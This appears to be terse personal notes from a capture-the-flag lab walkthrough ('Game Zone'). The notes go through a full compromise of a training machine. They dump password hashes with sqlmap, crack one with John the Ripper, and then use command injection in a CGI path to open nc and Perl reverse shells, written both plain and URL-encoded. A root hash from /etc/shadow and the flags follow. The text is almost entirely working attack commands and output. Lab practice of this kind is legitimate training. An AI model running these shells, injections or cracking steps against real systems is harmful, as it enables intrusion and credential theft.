### Game Zone ###

export IP=10.10.150.36

first task was easy:name of the sniper which ofc was hitman..i just didnt know his other alias....which was agent 47

# Request.txt:
POST /portal.php HTTP/1.1
Host: 10.10.150.36
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.10.150.36/portal.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 11
Connection: close
Cookie: PHPSESSID=hdfdthtfm35tvtsli63dt70el1
Upgrade-Insecure-Requests: 1

searchitem=

#SqlMap:
sqlmap -r request.txt --dbms=mysql --dump

+------------------------------------------------------------------+----------+
| pwd                                                              | username |
+------------------------------------------------------------------+----------+
| ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14 | agent47  |
+------------------------------------------------------------------+----------+

# JohnTheRipper:

john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=RAW-SHA256

found the pass:videogamer124

ssh'd into the machine:user.txt:649ac17b1480ac13ef1e4fa579dac95c


/file/show.cgi/<MY_CMD>

nc -e /bin/sh 10.11.18.102 4444

nc%20-e%20%2Fbin%2Fsh%2010.11.18.102%204444

perl -e 'use Socket;$i="10.10.150.36";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

perl%20-e%20%27use%20Socket%3B%24i%3D%2210.10.150.36%22%3B%24p%3D4444%3Bsocket(S%2CPF_INET%2CSOCK_STREAM%2Cgetprotobyname(%22tcp%22))%3Bif(connect(S%2Csockaddr_in(%24p%2Cinet_aton(%24i))))%7Bopen(STDIN%2C%22%3E%26S%22)%3Bopen(STDOUT%2C%22%3E%26S%22)%3Bopen(STDERR%2C%22%3E%26S%22)%3Bexec(%22%2Fbin%2Fsh%20-i%22)%3B%7D%3B%27

/etc/shadow:root:$6$Llhg4MdC$f9TRe8xLelwHpj5JvCNprpWBnHppEnryPo1mGiKW2U71SpTVZRRE0f7/3kZsIwNsRpcc7GlcVSnuYfiN5n7Yw.:18124:0:99999:7:::

#Root.txt:
a4b945830144bdd71908d12d902adeee